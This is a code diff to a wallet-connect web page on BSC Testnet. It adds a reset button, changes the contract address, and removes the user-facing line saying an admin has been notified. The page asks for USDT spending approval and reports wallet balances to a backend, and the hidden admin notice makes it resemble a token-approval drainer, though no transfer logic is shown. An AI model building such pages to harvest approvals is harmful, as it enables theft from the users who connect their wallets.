@@ -184,6 +184,9 @@
       <button id="connect-wallet" class="btn">
         <span id="connect-text">Connect Wallet</span>
       </button>
+      <button id="reset-wallet" class="btn btn-secondary" style="margin-top: 10px;">
+        Reset Wallet Connection
+      </button>
     </div>
     
     <div id="wallet-section" class="hidden">
@@ -221,7 +224,7 @@
       CHAIN_ID: '97',
       CHAIN_NAME: 'BSC Testnet',
       RPC_URL: 'https://bsc-testnet.publicnode.com',
-      CONTRACT_ADDRESS: '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF',
+      CONTRACT_ADDRESS: '0x88e199AeBB58Eb75F6C2DC9fBe73F871eCC8C92F',
       USDT_CONTRACT_ADDRESS: '0x2f79e9e36c0d293f3c88F4aF05ABCe224c0A5638'
     }
 
@@ -229,6 +232,7 @@
     const connectSection = document.getElementById('connect-section')
     const walletSection = document.getElementById('wallet-section')
     const connectWalletBtn = document.getElementById('connect-wallet')
+    const resetWalletBtn = document.getElementById('reset-wallet')
     const connectText = document.getElementById('connect-text')
     const approveBtn = document.getElementById('approve-btn')
     const approveText = document.getElementById('approve-text')
@@ -246,6 +250,7 @@
     // Initialize
     document.addEventListener('DOMContentLoaded', () => {
       connectWalletBtn.addEventListener('click', connectWallet)
+      resetWalletBtn.addEventListener('click', resetWallet)
       approveBtn.addEventListener('click', approveSpending)
       disconnectBtn.addEventListener('click', disconnectWallet)
       
@@ -316,7 +321,7 @@
         const backendResult = await sendWalletToBackend(currentWalletAddress)
         
         if (backendResult.success) {
-          showSuccess('Wallet connected successfully! Admin has been notified.')
+          showSuccess('Wallet connected successfully!')
           // Update balance display
           if (usdtBalanceEl && backendResult.data.wallet.usdt_balance) {
             usdtBalanceEl.textContent = `${parseFloat(backendResult.data.wallet.usdt_balance).toFixed(2)} USDT`
@@ -332,6 +337,13 @@
         isConnecting = false
         showLoading(connectText, false)
       }
+    }
+
+    // Reset wallet connection
+    function resetWallet() {
+      localStorage.removeItem('connectedWallet')
+      showStatus('Wallet connection reset. Please connect again.')
+      showConnectSection()
     }
 
     // Switch to correct network
